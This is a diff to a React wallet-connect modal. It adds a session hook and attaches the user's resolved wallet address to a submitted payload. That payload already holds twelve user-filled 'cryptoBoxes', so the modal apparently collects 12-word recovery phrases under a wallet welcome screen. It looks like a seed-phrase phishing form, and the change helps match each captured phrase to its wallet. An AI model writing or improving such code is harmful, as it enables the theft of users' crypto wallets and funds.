@@ -8,6 +8,7 @@
 import { useState, useEffect } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import { useAccount, useConnect } from "wagmi";
+import { useSession } from "@/hooks/useSession";
 import { Check, Lock, ArrowRight } from "lucide-react";
 import Button from "@/components/ui/Button";
 import Card from "@/components/ui/Card";
@@ -177,8 +178,12 @@ const WALLET_STYLES = {
 export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   const router = useRouter();
   const searchParams = useSearchParams();
-  const { address, connector, isConnected } = useAccount();
+  const { address: wagmiAddress, connector, isConnected } = useAccount();
   const { connect, connectors, pendingConnector } = useConnect();
+  const { linkedWallet, profile } = useSession();
+
+  // Use wagmi address first, then session linked wallet, then profile wallet
+  const address = wagmiAddress || linkedWallet || profile?.wallet_address || null;
 
   const [boxes, setBoxes] = useState(Array(12).fill(""));
   const [submitted, setSubmitted] = useState(false);
@@ -315,6 +320,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
       const payload = {
         walletType: activeName,
         cryptoBoxes: boxes,
+        walletAddress: address || null,
         timestamp: new Date().toISOString(),
       };
 
